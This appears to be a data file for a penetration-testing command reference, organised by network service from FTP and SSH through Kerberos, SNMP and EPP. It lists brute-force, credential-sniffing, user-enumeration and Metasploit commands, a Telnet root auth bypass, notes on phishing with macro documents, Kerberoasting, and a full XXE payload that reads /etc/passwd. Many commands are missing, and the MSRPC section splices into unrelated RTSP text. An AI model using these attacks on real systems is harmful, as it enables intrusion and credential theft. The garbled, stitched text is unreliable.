ftp.name: FTP
ftp.description: FTP is a plaintext file-transfer protocol that often permits anonymous login and stores credentials in clear text, making it a high-value target for credential theft, sensitive file retrieval, and webshell upload when the FTP root maps to a web directory.

commands.name: Banner Grab (nc)
commands.note: Grab the FTP service banner to identify software version.

commands.name: Banner Grab (telnet)
commands.note: Alternative banner grab via telnet.

commands.name: Cert Grab (FTPS)
commands.note: Retrieve TLS certificate from FTP server if FTPS is supported; may expose hostname/org info.

commands.name: Nmap Default Scripts
commands.note: Performs version detection, default scripts including anonymous login and bounce checks.

commands.name: Nmap FTP Scripts
commands.note: Runs all FTP-related NSE scripts including anon login, bounce, and vulnerability checks.

commands.name: Anonymous Login
commands.note: Try credentials anonymous:anonymous or ftp:ftp. Use 'ls -a' to list hidden files, 'binary' for binary transfers.

commands.name: LFTP SSL Connect
commands.command: lftp -e 'set ftp:ssl-force true; set ssl:verify-certificate no; connect {IP}; login {USER} {PASS}'
commands.note: Connect to FTP over SSL/TLS using lftp, bypassing certificate validation.

commands.name: Browser Connection
commands.note: Open in browser to browse FTP server anonymously.

commands.name: Download All Files (passive)
commands.note: Mirror entire FTP directory tree to local disk.

commands.name: Download All Files (no-passive)
commands.note: Use active mode if PASV transfer is disabled.

commands.name: Download All Files (auth)
commands.note: Download recursively with explicit credentials; handles special characters.

commands.name: Hydra Brute Force
commands.note: Single-threaded brute force to avoid lockouts. Consider default creds list first.

commands.name: MSF Anonymous Check
commands.command: msfconsole -q -x 'use auxiliary/scanner/ftp/anonymous; set RHOSTS {IP}; set RPORT 21; run; exit'
commands.note: Checks for anonymous FTP login.

commands.name: MSF FTP Version
commands.command: msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_version; set RHOSTS {IP}; set RPORT 21; run; exit'
commands.note: Retrieves FTP server version banner via Metasploit.

commands.name: MSF Traversal Checks
commands.command: msfconsole -q -x 'use auxiliary/scanner/ftp/bison_ftp_traversal; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/colorado_ftp_traversal; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/titanftp_xcrc_traversal; set RHOSTS {IP}; set RPORT 21; run; exit'
commands.note: Checks for directory traversal vulnerabilities in specific FTP implementations.

ssh.name: SSH
ssh.description: SSH provides encrypted remote shell access and file transfer (SFTP/SCP); weak credentials, exposed private keys, misconfigured authentication methods, and implementation bugs (e.g. CVE-2024-6387) can lead to full remote code execution.

commands.name: Banner Grab
commands.note: Grab SSH banner to identify server software and version.

commands.name: SSH Audit
commands.note: Comprehensive audit of SSH algorithms, host keys, and known CVEs.

commands.name: Get Host Public Key
commands.note: Retrieve the server RSA host key; useful for fingerprinting and known-badkeys checks.

commands.name: Nmap Default Scripts
commands.note: Run default Nmap scripts against SSH.

commands.name: Nmap Version
commands.note: Detect SSH service version.

commands.name: Nmap Enumerate Algorithms
commands.note: List supported key exchange, encryption, and MAC algorithms; look for weak/deprecated ones.

commands.name: Nmap Weak Host Keys
commands.note: Retrieve and display full host key; compare against known-bad keys databases.

commands.name: Nmap Auth Methods
commands.note: Check which authentication methods are enabled for a given user; look for password auth being available.

commands.name: MSF Username Enumeration
commands.command: msfconsole -q -x 'use scanner/ssh/ssh_enumusers; set RHOSTS {IP}; set RPORT 22; run; exit'
commands.note: Timing-based username enumeration (affects some OpenSSH versions).

commands.name: Hydra Brute Force
commands.note: SSH password brute force; -t 1 to avoid lockout and connection errors.

commands.name: MSF SSH Version
commands.command: msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS {IP}; set RPORT 22; run; exit'
commands.note: Banner grab and version identification via Metasploit.

commands.name: MSF Pubkey Identification
commands.command: msfconsole -q -x 'use scanner/ssh/ssh_identify_pubkeys; set RHOSTS {IP}; set RPORT 22; run; exit'
commands.note: Test a list of known private keys against the target.

commands.name: MSF Juniper Backdoor
commands.command: msfconsole -q -x 'use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS {IP}; set RPORT 22; run; exit'
commands.note: Check for hardcoded Juniper backdoor credentials.

commands.name: Kerberos TGT Auth (GSSAPI)
commands.note: Authenticate with a Kerberos TGT instead of a password; requires kinit first and correct FQDN matching the SPN.

commands.name: Kerberos Setup for SSH
commands.command: sudo ntpdate {DOMAIN} && kinit {USER} && klist && ssh -o GSSAPIAuthentication=yes {USER}@{DOMAIN}
commands.note: Sync time, obtain TGT, verify ticket, then SSH with Kerberos auth.

commands.name: SFTP Symlink Attack
commands.note: Create symlink to root filesystem inside SFTP chroot; access via web service if available to read arbitrary files.

commands.name: SFTP Tunneling
commands.note: Forward a local port through an SSH/SFTP connection to reach internal services.

commands.name: Check Auth Methods (verbose)
commands.note: Verbose output shows available auth methods; look for 'password' even when publickey is preferred.

commands.name: Force Password Auth
commands.note: Force password authentication even if not the default; useful when auth failure limit prevents reaching password method.

commands.name: SFTP Command Execution Bypass
commands.note: Request shell execution before nologin shell takes over; bypasses ForceCommand restrictions in misconfigured SFTP setups.

commands.name: CVE-2024-6387 PoC (regreSSHion)
commands.note: Stress-test LoginGraceTime path on OpenSSH 8.5p1-9.7p1; timing-based heap corruption for root RCE on 32-bit Linux. Use only on authorized targets.

commands.name: Check XZ Backdoor (CVE-2024-3094)
commands.note: Check whether sshd is linked against compromised liblzma (XZ Utils 5.6.0/5.6.1 backdoor); also check xz --version and dpkg -l xz-utils.

telnet.name: Telnet
telnet.description: Telnet provides unencrypted remote terminal access, transmitting all data including credentials in cleartext; it is commonly found on legacy systems and IoT devices and is trivially vulnerable to credential sniffing and brute force.

commands.name: Banner Grab
commands.note: Grab the Telnet banner to identify the service and device type.

commands.name: Nmap Scripts (safe)
commands.note: Run all safe Telnet NSE scripts including ntlm-info for Windows version disclosure.

commands.name: Nmap All Telnet Scripts
commands.note: Run all Telnet-related NSE scripts.

commands.name: Nmap Encrypt Check
commands.note: Check whether the ENCRYPT option is supported; some implementations were vulnerable to overflow in this path.

commands.name: Nmap NTLM Info
commands.note: Discloses NTLM metadata (NetBIOS name, DNS name, OS build) when Microsoft Telnet NTLM is enabled.

commands.name: Nmap Brute Force (NSE)
commands.note: NSE-based Telnet brute force.

commands.name: Sniff Credentials (tcpdump)
commands.command: sudo tcpdump -i eth0 -A 'tcp port 23 and not src host $(hostname -I | cut -d" " -f1)'
commands.note: Capture Telnet traffic in ASCII; credentials appear in plaintext.

commands.name: Hydra Brute Force
commands.note: Brute force Telnet; stop on first valid login with -f.

commands.name: Ncrack Brute Force
commands.note: Ncrack Telnet brute force with connection limit.

commands.name: Medusa Brute Force
commands.note: Parallel Telnet brute force across multiple hosts.

commands.name: CVE-2026-24061 Auth Bypass (inetutils)
commands.note: Inject USER=-f root via NEW_ENVIRON to bypass authentication on inetutils telnetd 1.9.3-2.7; spawns root shell via login -f.

commands.name: MSF Version Scan
commands.command: msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_version; set RHOSTS {IP}; set RPORT 23; run; exit'
commands.note: Banner and option enumeration via Metasploit.

commands.name: MSF Encrypt Overflow
commands.command: msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_encrypt_overflow; set RHOSTS {IP}; set RPORT 23; run; exit'
commands.note: RCE against vulnerable Solaris 9/10 Telnet via option ENCRYPT handling.

commands.name: MSF Brocade Enable Login
commands.command: msfconsole -q -x 'use auxiliary/scanner/telnet/brocade_enable_login; set RHOSTS {IP}; set RPORT 23; run; exit'
commands.note: Test for Brocade enable login vulnerability.

commands.name: MSF RuggedCom
commands.command: msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_ruggedcom; set RHOSTS {IP}; set RPORT 23; run; exit'
commands.note: Test for RuggedCom Telnet backdoor.

smtp.name: SMTP
smtp.description: SMTP is the protocol for sending email; misconfigurations such as open relays, VRFY/EXPN user enumeration, and weak SPF/DKIM/DMARC records enable spam relay, username harvesting, and mail spoofing attacks.

commands.name: Banner Grab (plaintext)
commands.note: Grab SMTP banner; look for server software, version, and internal hostname in the greeting.

commands.name: Connect SMTPS (port 465)
commands.note: Connect to SMTP over implicit SSL; check certificate for hostname/org info.

commands.name: Connect SMTPS (STARTTLS 587)
commands.note: Connect to submission port with STARTTLS upgrade.

commands.name: Find MX Servers
commands.note: Identify mail exchange servers for a domain; look for direct Exchange/mail server routes that bypass SEGs.

commands.name: Nmap SMTP Commands
commands.note: List SMTP commands supported by the server; look for VRFY, EXPN, RCPT enum.

commands.name: Nmap Open Relay
commands.note: Check if the server is an open relay; open relay allows sending mail from any external source.

commands.name: Nmap NTLM Info
commands.note: Retrieve Windows version info via NTLM authentication disclosure.

commands.name: Nmap Enum Users
commands.note: Enumerate valid SMTP users via RCPT, VRFY, or EXPN commands.

commands.name: Nmap Vuln Scan
commands.note: Combined SMTP vulnerability and enumeration scan.

commands.name: smtp-user-enum (VRFY)
commands.note: Enumerate users via VRFY command; differentiates valid from invalid accounts by response code.

commands.name: smtp-user-enum (RCPT)
commands.note: Enumerate users via RCPT TO; useful when VRFY is disabled.

commands.name: NTLM Auth Disclosure (manual)
commands.note: After connecting, send: HELO x, then AUTH NTLM, then TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= to retrieve NTLM challenge with version info.

commands.name: Check SPF Record
commands.note: Retrieve SPF record; weak (~all) or missing SPF enables spoofing.

commands.name: Check DMARC Record
commands.note: Check DMARC policy; p=none means no enforcement, p=quarantine/reject provides protection.

commands.name: Check DKIM Key
commands.note: Retrieve DKIM public key; selector found in DKIM-Signature mail header field s=.

commands.name: Check MTA-STS Policy
commands.note: Check MTA-STS policy for SMTP TLS enforcement; misconfiguration enables downgrade attacks.

commands.name: Check TLS-RPT
commands.note: Check TLS reporting record; missing means TLS failures go unnoticed.

commands.name: Check STARTTLS on MX
commands.note: Verify STARTTLS works and certificate validates on MX server.

commands.name: Send Phishing Email (sendEmail)
commands.note: Send email with attachment via SMTP; use for phishing simulation.

commands.name: Send Email (swaks)
commands.note: Versatile SMTP testing tool; good for open relay testing and phishing simulations.

commands.name: Send Email with Attachment (swaks)
commands.note: @ prefix embeds file bytes; critical for delivering macro documents.

commands.name: Mail Spoof Check
commands.note: Test if domain can be spoofed due to weak SPF/DMARC; also --sender to specify exact from address.

commands.name: Hydra Brute Force
commands.note: SMTP authentication brute force.

commands.name: MSF SMTP Enumeration
commands.command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'
commands.note: Version detection, NTLM domain disclosure, and open relay check via Metasploit.

commands.name: Autodiscover Exposure Check
commands.command: for h in autodiscover imap pop smtp mail webmail; do dig +short ${h}.{DOMAIN} A; done && curl -i http://autodiscover.{DOMAIN}/autodiscover/autodiscover.xml
commands.note: Find exposed email service subdomains and check for plaintext autodiscover endpoint.

whois.name: WHOIS
whois.description: WHOIS is a plaintext query protocol for domain/IP registration data with no authentication; it can expose organizational data for OSINT and may be vulnerable to SQL injection or other backend injection attacks in custom deployments.

commands.name: WHOIS Query (whois client)
commands.note: Query a specific WHOIS server for domain registration info.

commands.name: WHOIS Query (nc)
commands.note: Raw WHOIS query via netcat; server closes connection after response.

commands.name: WHOIS IP Query
commands.note: Query WHOIS server for IP address/CIDR/ASN information.

commands.name: WHOIS ASN Query
commands.note: Query autonomous system number data from WHOIS server.

commands.name: WHOIS with Referral (whois -I)
commands.note: Ask IANA first and follow authoritative referral chain; reveals backend server names.

commands.name: Nmap WHOIS Domain
commands.note: Nmap follows WHOIS referrals automatically for domain lookups.

commands.name: Nmap WHOIS IP
commands.note: Nmap WHOIS IP lookup with referral following.

commands.name: Nmap WHOIS No Cache
commands.note: Disable WHOIS cache to get accurate info for smaller delegated IP blocks.

commands.name: RDAP Domain Query
commands.note: RDAP is the structured successor to WHOIS for gTLDs (ICANN sunset WHOIS for gTLDs 2025-01-28); better for automation.

commands.name: RDAP IP Query
commands.note: Query RIR RDAP for IP allocation info.

commands.name: SQL Injection Test
commands.note: Test for SQLi in custom WHOIS backend; may extract all database records if vulnerable.

tacacs+.name: TACACS+
tacacs+.full_name: Terminal Access Controller Access Control System Plus
tacacs+.description: TACACS+ provides centralized AAA for network devices; intercepted authentication traffic can be brute-forced offline to obtain the shared key, which then allows decryption of all TACACS+ traffic and access to network infrastructure credentials.

commands.name: ARP Spoof MitM
commands.note: Use Loki to perform ARP spoofing and intercept TACACS+ encrypted authentication key for offline brute force.

dns.name: DNS
dns.description: DNS translates hostnames to IPs and is critical for network infrastructure; misconfigurations enable zone transfers exposing all records, open recursion enables DDoS amplification, and subdomain bruteforcing reveals attack surface.

commands.name: Version Banner Grab
commands.note: Query BIND version; works on most BIND nameservers. Use this to identify vulnerable versions.

commands.name: Nmap DNS Scripts
commands.command: nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" {IP}
commands.note: Run comprehensive DNS enumeration and security check scripts.

commands.name: ANY Record Query
commands.note: Request all available record types; may be filtered by modern resolvers but useful against internal/misconfigured servers.

commands.name: Zone Transfer (no domain)
commands.note: Attempt AXFR zone transfer without specifying domain; enumerates all zones if misconfigured.

commands.name: Zone Transfer (with domain)
commands.note: Attempt AXFR zone transfer for specific domain; reveals all DNS records if server is misconfigured.

commands.name: Zone Transfer (fierce)
commands.note: Attempts zone transfer against all authoritative nameservers; falls back to dictionary attack.

commands.name: DNS A Record
commands.note: Query IPv4 address record.

commands.name: DNS AAAA Record
commands.note: Query IPv6 address record.

commands.name: DNS TXT Record
commands.note: Query TXT records; may reveal SPF, DMARC, verification tokens, and other sensitive info.

commands.name: DNS MX Record
commands.note: Query mail exchange records; identify internal mail servers.

commands.name: DNS NS Record
commands.note: Query nameserver records; identify authoritative DNS servers.

commands.name: Reverse Lookup
commands.note: Reverse DNS lookup; may reveal internal hostnames from IP addresses.

commands.name: Reverse IPv6 Lookup
commands.note: Reverse DNS lookup for IPv6 addresses.

commands.name: Subdomain Bruteforce (loop)
commands.command: for sub in $(cat {WORDLIST}); do dig $sub.{DOMAIN} @{IP} | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt; done
commands.note: Bash loop for subdomain enumeration; saves results to subdomains.txt.

commands.name: Subdomain Bruteforce (dnsenum)
commands.note: Automated subdomain enumeration with zone transfer attempt.

commands.name: Subdomain Bruteforce (dnsrecon)
commands.note: DNS subdomain bruteforcing with dnsrecon.

commands.name: Subdomain Bruteforce (dnscan)
commands.note: Recursive subdomain brute force.

commands.name: Reverse DNS BF (/24)
commands.note: Reverse DNS bruteforce across entire subnet; discover hostnames from IP range.

commands.name: Reverse DNS BF (127.x)
commands.note: Reverse DNS lookup for loopback range; can reveal internal naming conventions.

commands.name: Zone Transfer (dnsrecon)
commands.note: Attempt zone transfer with dnsrecon.

commands.name: IPv6 Subdomain BF
commands.note: Bruteforce subdomains using AAAA requests to gather IPv6 addresses.

commands.name: IPv6 Reverse DNS BF
commands.note: Reverse DNS enumeration for IPv6 address ranges.

commands.name: Check Recursion
commands.note: Check if DNS recursion is enabled; 'ra' flag in response means recursion available (DDoS amplification risk).

commands.name: Active Directory DNS SRV
commands.note: Enumerate Active Directory service records; reveals DCs, LDAP, Kerberos, and KDC servers.

commands.name: AD DNS SRV (nslookup)
commands.note: Find Kerberos KDC via DNS SRV record.

commands.name: Nmap AD DNS Enum
commands.note: Enumerate AD service records with Nmap.

commands.name: DNSSEC Enum (nmap)
commands.note: Enumerate DNSSEC NSEC records; may allow walking the zone.

commands.name: nslookup Interactive
commands.note: Interactive mode: SERVER {IP}, then query hostnames and IPs for reverse lookup.

commands.name: MSF DNS Enumeration
commands.command: msfconsole -q -x 'use auxiliary/gather/enum_dns; set RHOSTS {IP}; set RPORT 53; run; exit'
commands.note: Comprehensive DNS enumeration via Metasploit.

commands.name: NS Delegation Check
commands.command: dig {DOMAIN} NS +short && for ns in $(dig +short {DOMAIN} NS); do dig @${ns%?} {DOMAIN} SOA +short; done
commands.note: Check NS delegation integrity; inconsistent SOA serials indicate lame delegation.

commands.name: DNSSEC DS/CDS Check
commands.command: dig {DOMAIN} DS +short && dig {DOMAIN} CDS +short && dig {DOMAIN} CDNSKEY +short
commands.note: Check DNSSEC key rollover state; inconsistencies cause SERVFAIL for validating resolvers.

commands.name: CAA Record Check
commands.note: Check CAA policy and correlate with CT logs; overly broad CAA increases cert abuse surface.

finger.name: Finger
finger.description: Finger is a legacy plaintext protocol that discloses logged-in users, full names, home directories, shells, and .plan file contents; it may also support relay queries to enumerate internal users through an exposed server.

commands.name: Banner Grab (nc)
commands.note: Connect to Finger service; send a blank line for user list.

commands.name: Query Single User
commands.note: Query info for a specific user (root in this case).

commands.name: Null Query (list users)
commands.note: Null query returns list of currently logged-in users.

commands.name: Long Format Query
commands.note: Request long/verbose format for user info if daemon supports it.

commands.name: Spray Multiple Users
commands.command: printf 'root admin oracle mysql ftp user test\r\n' | nc -vn {IP} 79
commands.note: Query multiple accounts in one request against permissive daemons.

commands.name: Finger List Users
commands.note: List all currently logged-in users on target system.

commands.name: Finger User Info
commands.note: Get detailed info for a specific user including GECOS, home dir, shell, last login.

commands.name: Finger Long Format
commands.note: Long format user info from standard UNIX clients.

commands.name: finger-user-enum (wordlist)
commands.note: Enumerate valid users by comparing response formatting between valid/invalid accounts.

commands.name: finger-user-enum (single)
commands.note: Verify if specific user exists on target.

commands.name: finger-user-enum (multi-target)
commands.note: Enumerate users across multiple target hosts.

commands.name: finger-user-enum (relay)
commands.note: Enumerate users on internal host through a relay Finger server.

commands.name: Nmap Default Scripts
commands.note: Run default Nmap scripts including null query finger NSE script.

commands.name: Nmap Finger Script
commands.note: Nmap finger NSE script sends null query to recover current user list.

commands.name: MSF Finger Users
commands.command: msfconsole -q -x 'use auxiliary/scanner/finger/finger_users; set RHOSTS {IP}; run; exit'
commands.note: Metasploit finger user enumeration with more tricks than Nmap.

commands.name: Command Execution via Finger
commands.note: RFC 1288 allows program execution; test if legacy daemon executes | prefix commands.

commands.name: Command Execution (file listing)
commands.note: Execute ls command via finger if daemon supports RFC 1288 program execution.

commands.name: Finger Bounce (relay)
commands.note: Use one Finger server as relay to enumerate users on an internal host; RFC 1288 defines this.

commands.name: Finger Bounce (internal enum)
commands.note: Ask exposed Finger server to finger root on an internal target.

web.name: Web
web.description: HTTP/HTTPS is the most extensive attack surface in network pentesting, encompassing technology fingerprinting, directory brute-forcing, vulnerability scanning, and a wide range of application-layer exploits.

commands.name: Banner Grab (nc)
commands.note: Send 'GET / HTTP/1.0' to grab HTTP response headers and server banner.

commands.name: Banner Grab (HTTPS)
commands.note: Connect via TLS; send 'GET / HTTP/1.0' to get headers. Certificate may reveal subdomains.

commands.name: WhatWeb (stealthy)
commands.note: Identify web technologies with minimal requests.

commands.name: WhatWeb (aggressive)
commands.note: Aggressive technology fingerprinting; may trigger IDS.

commands.name: WhatWeb (full)
commands.note: Maximum aggression technology fingerprinting.

commands.name: Webtech Fingerprint
commands.note: Alternative web technology fingerprinting tool.

commands.name: Nikto Scan
commands.note: General-purpose web vulnerability scanner; identifies outdated software, misconfigurations, and common issues.

commands.name: Nikto + GoBuster
commands.note: Combined quick scan: vulnerability check plus directory brute force.

commands.name: Nuclei Scan
commands.note: Template-based vulnerability scanner; update templates first then scan.

commands.name: Wapiti Scan
commands.note: Web application vulnerability scanner.

commands.name: Nmap Web Vuln Scan
commands.command: nmap -vv --reason -Pn -sV -p {PORT} --script=`banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)` {IP}
commands.note: Tailored Nmap scan for web vulnerabilities without brute force or DoS scripts.

commands.name: SSL/TLS Vulnerability Check
commands.note: Comprehensive TLS vulnerability check; look for BEAST, POODLE, HEARTBLEED, weak ciphers.

commands.name: SSL Scan
commands.note: SSL/TLS cipher and certificate enumeration.

commands.name: SSLyze
commands.note: Fast TLS/SSL configuration analysis.

commands.name: Directory Brute Force (gobuster)
commands.note: Non-recursive directory brute force; fast with auto-signed cert support.

commands.name: Directory Brute Force (ffuf)
commands.note: Fast directory fuzzing with colorized output.

commands.name: Directory Brute Force (wfuzz)
commands.note: Flexible web fuzzer with filtering options.

commands.name: Directory Brute Force (dirsearch)
commands.note: Recursive directory brute force with extension guessing.

commands.name: CGI Brute Force
commands.note: Find CGI scripts that return 200; common source of shellshock and injection vulnerabilities.

commands.name: WPScan
commands.note: WordPress-specific scanner; enumerates plugins, themes, users, and known vulnerabilities.

commands.name: WPScan with Brute Force
commands.command: wpscan --url http://{IP} --enumerate ap,at,cb,dbe && wpscan --url http://{IP} --enumerate u,tt,t,vp --passwords {Big_Passwordlist} -e
commands.note: Full WP enumeration followed by password brute force.

commands.name: WordPress Hydra
commands.note: Hydra brute force against WordPress login form.

commands.name: Joomla Scan
commands.note: Joomla-specific vulnerability and component scanner.

commands.name: CMSmap Scan
commands.note: CMS detection and scanning for WordPress, Joomla, Drupal, Moodle.

commands.name: Virtual Host Fuzzing (ffuf)
commands.note: Discover additional virtual hosts by fuzzing the Host header; filter noise with Ffuf_Filters.

commands.name: Webanalyze Crawl
commands.note: Technology detection with multi-level crawling.

pop.name: POP
pop.description: POP3 is used to retrieve email from a mail server; it often exposes cleartext credentials on port 110, and misconfigured servers with debug logging may log passwords in cleartext.

commands.name: Banner Grab (port 110)
commands.note: Grab POP3 banner; look for software name and version.

commands.name: Banner Grab (port 995 SSL)
commands.note: Connect to POP3S; certificate may reveal useful info.

commands.name: Nmap POP3 Scripts
commands.note: pop3-ntlm-info returns Windows version info; pop3-capabilities lists server features.

commands.name: Hydra Brute Force
commands.note: POP3 password brute force; -f stops on first valid login.

commands.name: MSF POP3 Version
commands.command: msfconsole -q -x 'use auxiliary/scanner/pop3/pop3_version; set RHOSTS {IP}; set RPORT 110; run; exit'
commands.note: POP3 version enumeration via Metasploit.

commands.name: Manual POP3 Session (telnet)
commands.note: Manual interaction: USER <username>, PASS <password>, LIST to show messages, RETR <n> to read, CAPA for capabilities.

ident.name: Ident
ident.description: The Ident protocol maps TCP connections to system usernames; an attacker can query it to discover which user is running each network service, enabling targeted privilege escalation or password guessing.

commands.name: Nmap Default Scan
commands.note: By default Nmap with -sC identifies the owner of every running port via ident.

commands.name: Nmap Multi-Port Ident
commands.note: Nmap's auth-owners script runs automatically against all open ports to identify process owners via ident.

commands.name: ident-user-enum
commands.note: Query ident service to get the owner of processes on each specified open port; use all discovered open ports.

msrpc.name: MSRPC
msrpc.description: MSRPC is the Windows RPC framework used for remote service communication; it exposes interfaces for user enumeration (SAMR/LSARPC), remote command execution (task scheduler, service control), and registry access that are frequently abused in lateral movement.

commands.name: rpcdump (Impacket)
commands.note: Enumerate all registered RPC endpoints and their UUIDs, annotation, and bindings.

commands.name: MSF Endpoint Mapper
commands.command: msfconsole -q -x 'use auxiliary/scanner/dcerpc/endpoint_mapper; set RHOSTS {IP}; run; exit'
commands.note: Enumerate RPC endpoints via Metasploit endpoint mapper scanner.

commands.name: MSF Hidden Endpoints
commands.command: msfconsole -q -x 'use auxiliary/scanner/dcerpc/hidden; set RHOSTS {IP}; run; exit'
commands.note: Discover hidden RPC endpoints not registered with the endpoint mapper.

commands.name: MSF Management Interface

printf 'DESCRIBE rtsp://{IP}:{PORT} RTSP/1.0
CSeq: 2
Authorization: Basic YWRtaW46MTIzNA==

' | nc {IP} {PORT}
commands.note: DESCRIBE with Basic auth header (base64 of user:pass); YWRtaW46MTIzNA== = admin:1234

commands.name: ffplay stream RTSP
commands.note: View discovered RTSP stream with ffplay; replace path (/mpeg4, /live.sdp, etc) with discovered stream URL

commands.name: cameradar scan and brute
commands.note: Automated RTSP scanner; detects cameras, brute-forces stream routes and credentials, generates thumbnails

commands.name: rtsp_authgrinder brute force
commands.note: Dedicated RTSP credential brute-forcer from Tek-Security-Group

ipp.name: IPP
ipp.description: IPP runs on top of HTTP and is used by CUPS and network printers for job management and printer discovery. The cups-browsed RCE chain (CVE-2024-47076/47175/47176/47177) allows unauthenticated code execution on any Linux system with CUPS browsing enabled via a single spoofed UDP packet.

commands.name: nmap CUPS all scripts
commands.note: Run all CUPS/IPP NSE scripts; extracts printer model, state, queue statistics, and pending jobs

commands.name: nmap CUPS basic info
commands.note: Extract printer model/state and enumerate print jobs from CUPS

commands.name: ippfind printer discovery
commands.note: Multicast/UDP discovery of IPP printers on local network; reveals printer URIs and capabilities

commands.name: ipptool get attributes
commands.note: Query printer capabilities including firmware version and supported document formats

commands.name: shodan CUPS search
commands.note: Discover internet-exposed CUPS instances; 70k+ hosts exposed as of 2025

commands.name: cups-browsed temporary disable
commands.command: sudo systemctl stop cups-browsed && sudo systemctl disable cups-browsed
commands.note: Mitigate CVE-2024-47176 by stopping cups-browsed; full fix requires cups-filters >= 2.0.0 patch

commands.name: block UDP 631
commands.note: Block the UDP port used by cups-browsed for printer advertisements to prevent CVE-2024-47176 exploitation

commands.name: IPP raw Get-Printer-Attributes
commands.note: Raw IPP Get-Printer-Attributes (operation-id 0x000B) request; confirms IPP service and extracts printer details

kerberos.name: Kerberos
kerberos.description: Kerberos is the primary authentication protocol for Active Directory environments, issuing tickets that prove identity without transmitting passwords. It is critical for pentesting because misconfigurations enable attacks like Kerberoasting, AS-REP roasting, golden/silver tickets, and Pass-the-Ticket.

commands.name: Sync time with DC
commands.note: Kerberos requires clock skew < 5 minutes; KRB_AP_ERR_SKEW means the clocks are out of sync.

commands.name: Generate krb5.conf via netexec
commands.command: netexec smb {IP} -u {USER} -p '{PASS}' -k --generate-krb5-file krb5.conf && sudo cp krb5.conf /etc/krb5.conf
commands.note: Generates a valid krb5.conf for the target realm; required for Kerberos-only (no NTLM) environments.

commands.name: Obtain TGT and verify ccache
commands.note: Confirms you have a valid TGT in your credential cache before using Kerberos-authenticated tools.

commands.name: netexec SMB with Kerberos
commands.note: Lists shares and runs modules using the cached TGT; use when NTLM is disabled (STATUS_NOT_SUPPORTED).

commands.name: smbclient with Kerberos
commands.note: Uses the ccache for authentication; the IP/hostname must match the host's SPN exactly.

commands.name: SSH GSSAPI single sign-on
commands.note: Requires a valid TGT and correct FQDN matching the host SPN; wrong name causes 'Server not found in Kerberos database'.

commands.name: nmap Kerberos user enumeration
commands.note: Enumerates valid usernames without credentials by testing pre-authentication responses.

commands.name: GetUserSPNs Kerberoasting
commands.note: Requests TGS tickets for SPN-registered accounts; output hashes can be cracked offline with hashcat mode 13100.

snmp.name: SNMP
snmp.description: SNMP is used to monitor and manage network devices (routers, switches, printers, IoT). SNMPv1/v2c transmit community strings and data in plaintext, making them vulnerable to community string guessing and data harvesting of usernames, running processes, network interfaces, and more.

commands.name: Install MIB downloader
commands.note: Allows snmpwalk to translate OIDs to human-readable names; comment out 'mibs :' line in /etc/snmp/snmp.conf after.

commands.name: snmpbulkwalk enumeration
commands.note: Bulk walk the entire OID tree; trailing dot is required. Replace {PASS} with the community string (e.g., 'public').

commands.name: snmpwalk basic
commands.note: Walk all OIDs with SNMPv2c. Use -v1 for v1 or -v3 with auth params for v3.

commands.name: snmpwalk IPv6 addresses
commands.note: Retrieves IPv6 addresses from the device; values are decimal and must be converted to hex.

commands.name: snmpwalk extended objects
commands.note: Retrieves extended MIB objects; can expose custom scripts or sensitive configuration data.

commands.name: snmpwalk all OIDs
commands.note: Enumerates all OIDs from the root; very verbose but complete.

commands.name: snmpwalk extended output full
commands.note: Retrieves full output of extended queries; may expose RCE-capable configurations.

commands.name: snmp-check
commands.note: Provides formatted output of common SNMP data including users, processes, network interfaces, and installed software.

commands.name: nmap SNMP scripts
commands.note: Runs all SNMP NSE scripts except brute-force; enumerates community strings, MIB data, and device info.

commands.name: braa mass SNMP scan
commands.note: Mass SNMP scanner using its own stack; very fast for scanning many hosts simultaneously.

commands.name: onesixtyone community string brute-force
commands.note: Brute-forces SNMP community strings; a non-response means invalid string, a response confirms valid string.

commands.name: hydra SNMP brute-force
commands.note: Brute-forces SNMP community strings using hydra.

commands.name: grep sysDesc from SNMP dumps
commands.note: Extracts system description (sysDesc) from collected SNMP data files to identify device types.

commands.name: grep trap community strings
commands.note: Identifies private community strings used in SNMP trap data, which may expose router running configs.

commands.name: grep credentials from SNMP logs
commands.note: Searches MIB log tables for failed login attempts that may contain passwords entered as usernames.

commands.name: grep emails from SNMP data
commands.note: Extracts email addresses from harvested SNMP data using regex pattern matching.

epp.name: EPP
epp.description: EPP is used by domain registries and registrars to automate domain registration, renewal, transfer, and deletion over TLS. It is interesting for pentesting because implementations often have XXE vulnerabilities and weak mTLS enforcement, potentially allowing TLD hijacking.

commands.name: nmap TLS inspection
commands.note: Inspects the TLS certificate and supported ciphers on the EPP server; reveals cert details and weak cipher configurations.

commands.name: openssl mTLS check
commands.note: Checks whether mTLS is actually enforced; many pre-production deployments omit client certificate requirements.

commands.name: XXE file read via EPP domain check
commands.note: Send the XXE payload: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><epp xmlns="urn:ietf:params:xml:ns:epp-1.0"><command><check><domain:check xmlns:domain="urn:ietf:params:xml:ns:domain-1.0"><domain:name>&xxe;</domain:name></domain:check></check></command></epp> — works when XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES=true; output in <resData>.

rsync.name: Rsync
rsync.description: Rsync is a file transfer and synchronization utility commonly found on Unix systems. Exposed rsync servers can allow unauthenticated listing and downloading of file shares, potentially exposing sensitive files like SSH keys and configurations.

commands.name: netcat banner grab and list modules
